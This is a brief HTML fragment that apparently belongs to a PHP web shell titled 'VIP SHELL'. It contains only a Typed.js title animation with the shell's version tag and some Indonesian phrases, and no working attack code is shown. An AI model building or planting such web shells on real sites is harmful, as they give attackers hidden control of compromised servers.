...
<body>
    ...
    <script>
        // --- Shell JavaScript ---
        var typed = new Typed('#shell-title', { strings: ['VIP SHELL<?php echo $SHELL_VERSION; ?>', 'AVATAR', 'HENCAN DISINI', 'Tolong Kaki Saya Sakit...^1000'], typeSpeed: 40, backSpeed: 25, loop: true, showCursor: true, cursorChar: '█', smartBackspace: true });
